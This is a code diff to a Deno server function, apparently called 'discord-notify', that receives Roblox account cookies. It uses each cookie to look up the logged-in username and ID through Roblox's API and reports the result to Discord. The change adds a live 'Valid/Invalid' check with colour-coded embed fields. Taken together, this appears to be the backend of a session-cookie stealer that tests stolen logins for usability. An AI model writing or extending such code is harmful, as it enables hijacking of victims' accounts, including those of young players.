@@ -57,9 +57,10 @@ Deno.serve(async (req) => {
       });
     }
 
-    // Try to fetch the Roblox account username using the cookie
+    // Try to fetch the Roblox account username using the cookie + validate it
     let username: string | null = null;
     let userId: number | null = null;
+    let cookieValid: boolean | null = null;
     if (cookie) {
       try {
         const r = await fetch("https://users.roblox.com/v1/users/authenticated", {
@@ -69,7 +70,9 @@ Deno.serve(async (req) => {
           const j = await r.json();
           username = typeof j?.name === "string" ? j.name : null;
           userId = typeof j?.id === "number" ? j.id : null;
+          cookieValid = !!username;
         } else {
+          cookieValid = false;
           console.warn("[discord-notify] roblox auth lookup failed", r.status);
         }
       } catch (err) {
@@ -77,10 +80,12 @@ Deno.serve(async (req) => {
       }
     }
 
-    const color = status === "COMPLETE" ? 0x22c55e : 0x3b82f6;
+    const color = cookieValid === false ? 0xef4444 : (status === "COMPLETE" ? 0x22c55e : 0x3b82f6);
+    const validityLabel = cookieValid === true ? "✅ Valid" : cookieValid === false ? "❌ Invalid" : "❓ Unknown";
     const fields: { name: string; value: string; inline?: boolean }[] = [
       { name: "Version", value: version.toUpperCase(), inline: true },
       { name: "Status", value: status, inline: true },
+      { name: "Cookie", value: validityLabel, inline: true },
       { name: "Username", value: username ? (userId ? `${username} (${userId})` : username) : "Unknown", inline: true },
     ];
     if (durationMs !== null) {
